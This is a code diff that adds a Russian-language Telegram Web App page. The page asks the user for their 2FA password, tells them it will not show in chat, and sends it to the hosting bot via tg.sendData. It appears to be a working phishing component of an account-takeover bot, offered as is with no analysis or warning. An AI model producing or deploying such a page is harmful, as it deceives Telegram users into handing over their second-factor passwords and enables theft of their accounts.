@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Введите 2FA</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    body {
+      margin: 0;
+      padding: 24px;
+      background: #111;
+      color: white;
+      font-family: Arial, sans-serif;
+    }
+
+    .box {
+      max-width: 420px;
+      margin: 40px auto;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px;
+      font-size: 18px;
+      border-radius: 10px;
+      border: none;
+      margin-top: 12px;
+      box-sizing: border-box;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      margin-top: 18px;
+      border: none;
+      border-radius: 10px;
+      font-size: 17px;
+      background: #2ea6ff;
+      color: white;
+      cursor: pointer;
+    }
+
+    .hint {
+      color: #aaa;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>Введите 2FA пароль</h2>
+    <input id="password" type="password" placeholder="Пароль 2FA" autocomplete="off" />
+    <button onclick="sendPassword()">Отправить</button>
+    <div class="hint">Пароль не будет виден в чате.</div>
+  </div>
+
+  <script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+
+    function sendPassword() {
+      const password = document.getElementById("password").value.trim();
+
+      if (!password) {
+        alert("Введите пароль");
+        return;
+      }
+
+      tg.sendData(JSON.stringify({
+        type: "2fa_password",
+        password: password
+      }));
+
+      tg.close();
+    }
+  </script>
+</body>
+</html>
